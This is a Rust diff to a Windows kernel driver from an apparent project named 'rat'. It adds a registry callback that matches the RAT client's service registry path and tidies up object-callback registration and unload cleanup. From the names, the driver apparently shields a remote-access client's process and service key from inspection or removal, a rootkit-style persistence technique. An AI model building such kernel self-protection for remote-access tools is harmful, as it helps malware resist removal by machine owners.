@@ -1,13 +1,15 @@
+use alloc::boxed::Box;
 use core::ffi::c_void;
 use core::sync::atomic::{AtomicPtr, Ordering};
-use core::{mem, ptr};
+use core::{mem, ptr, slice};
 
+use aho_corasick::AhoCorasickBuilder;
 use rat_common::utils::DropGuard;
 use wdk::{self, nt_success};
 use wdk_sys::_MODE::KernelMode;
 use wdk_sys::ntddk::{
-    KeDelayExecutionThread, ObUnRegisterCallbacks, PsCreateSystemThread, RtlInitUnicodeString,
-    ZwClose, ZwCreateKey,
+    CmUnRegisterCallback, KeDelayExecutionThread, ObUnRegisterCallbacks, PsCreateSystemThread,
+    RtlInitUnicodeString, ZwClose, ZwCreateKey,
 };
 use wdk_sys::{
     HANDLE, KEY_ALL_ACCESS, LARGE_INTEGER, NTSTATUS, OBJ_CASE_INSENSITIVE, OBJ_KERNEL_HANDLE,
@@ -18,13 +20,14 @@ use wdk_sys::{
 use widestring::{U16CStr, Utf16Str, u16cstr};
 
 use crate::global::{
-    MAX_INITIALIZE_ATTEMPTS, RAT_CLIENT, RAT_CLIENT_OBJ_PATH, RAT_CLIENT_SERVICE_PATH,
-    SERVICE_REGISTRY,
+    CM_REGISTER_CALLBACK_COOKIE, MAX_INITIALIZE_ATTEMPTS, OB_REGISTER_CALLBACKS_HANDLE, RAT_CLIENT,
+    RAT_CLIENT_OBJ_PATH, RAT_CLIENT_SERVICE_PATH, SERVICE_REGISTRY, SERVICE_REGISTRY_AHO_CORASICK,
 };
 use crate::handlers::object;
+use crate::handlers::registry::cm_register_callback;
 use crate::wrappers::bindings::InitializeObjectAttributes;
 use crate::wrappers::{fs, registry};
-use crate::{error, info};
+use crate::{error, info, warn};
 
 type DriverUnloadFn = unsafe extern "C" fn(driver: PDRIVER_OBJECT);
 
@@ -138,8 +141,12 @@ fn initialize(driver: PDRIVER_OBJECT) -> anyhow::Result<()> {
             info!("Register object callbacks successfully");
 
             if let Some(driver) = unsafe { driver.as_mut() } {
-                static HANDLE: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
-                HANDLE.store(handle, Ordering::Release);
+                let handle = OB_REGISTER_CALLBACKS_HANDLE.swap(handle, Ordering::AcqRel);
+                if !handle.is_null() {
+                    unsafe {
+                        ObUnRegisterCallbacks(handle);
+                    }
+                }
 
                 static CURRENT_DRIVER_UNLOAD: AtomicPtr<u8> = AtomicPtr::new(ptr::null_mut());
                 if let Some(unload) = driver.DriverUnload {
@@ -158,7 +165,8 @@ fn initialize(driver: PDRIVER_OBJECT) -> anyhow::Result<()> {
                         }
                     }
 
-                    let handle = HANDLE.load(Ordering::Acquire);
+                    let handle =
+                        OB_REGISTER_CALLBACKS_HANDLE.swap(ptr::null_mut(), Ordering::AcqRel);
                     unsafe {
                         ObUnRegisterCallbacks(handle);
                     }
@@ -168,6 +176,81 @@ fn initialize(driver: PDRIVER_OBJECT) -> anyhow::Result<()> {
         Err(e) => {
             success = false;
             error!("Failed to register object callbacks: {e}");
+        }
+    }
+
+    match cm_register_callback(driver) {
+        Ok(cookie) => {
+            info!("Register registry callbacks successfully");
+
+            if let Some(driver) = unsafe { driver.as_mut() } {
+                let cookie =
+                    CM_REGISTER_CALLBACK_COOKIE.swap(unsafe { cookie.QuadPart }, Ordering::AcqRel);
+                if cookie != 0 {
+                    unsafe {
+                        let _ = CmUnRegisterCallback(LARGE_INTEGER { QuadPart: cookie });
+                    }
+                }
+
+                match AhoCorasickBuilder::new()
+                    .ascii_case_insensitive(true)
+                    .build(&[unsafe {
+                        slice::from_raw_parts(
+                            SERVICE_REGISTRY.as_ptr().cast(), // interpret as a &[u8] slice for aho-corasick
+                            SERVICE_REGISTRY.len() * mem::size_of::<u16>(),
+                        )
+                    }]) {
+                    Ok(ac) => {
+                        let ac = SERVICE_REGISTRY_AHO_CORASICK
+                            .swap(Box::into_raw(Box::new(ac)), Ordering::AcqRel);
+                        if !ac.is_null() {
+                            unsafe {
+                                let _ = Box::from_raw(ac);
+                            }
+                        }
+                    }
+                    Err(e) => {
+                        success = false;
+                        error!("Failed to build Aho-Corasick automaton: {e}");
+                    }
+                }
+
+                static CURRENT_DRIVER_UNLOAD: AtomicPtr<u8> = AtomicPtr::new(ptr::null_mut());
+                if let Some(unload) = driver.DriverUnload {
+                    CURRENT_DRIVER_UNLOAD.store(unload as *mut u8, Ordering::Release);
+                }
+
+                driver.DriverUnload = Some(driver_unload);
+
+                unsafe extern "C" fn driver_unload(driver: PDRIVER_OBJECT) {
+                    let old_driver_unload_ptr = CURRENT_DRIVER_UNLOAD.load(Ordering::Acquire);
+                    if !old_driver_unload_ptr.is_null() {
+                        unsafe {
+                            let old_driver_unload =
+                                mem::transmute::<*mut u8, DriverUnloadFn>(old_driver_unload_ptr);
+                            old_driver_unload(driver);
+                        }
+                    }
+
+                    let cookie = CM_REGISTER_CALLBACK_COOKIE.swap(0, Ordering::AcqRel);
+                    let status =
+                        unsafe { CmUnRegisterCallback(LARGE_INTEGER { QuadPart: cookie }) };
+                    if !nt_success(status) {
+                        warn!("CmUnRegisterCallback failed: 0x{status:X}");
+                    }
+
+                    let ac = SERVICE_REGISTRY_AHO_CORASICK.swap(ptr::null_mut(), Ordering::AcqRel);
+                    if !ac.is_null() {
+                        unsafe {
+                            let _ = Box::from_raw(ac);
+                        }
+                    }
+                }
+            }
+        }
+        Err(e) => {
+            success = false;
+            error!("Failed to register registry callbacks: {e}");
         }
     }
 
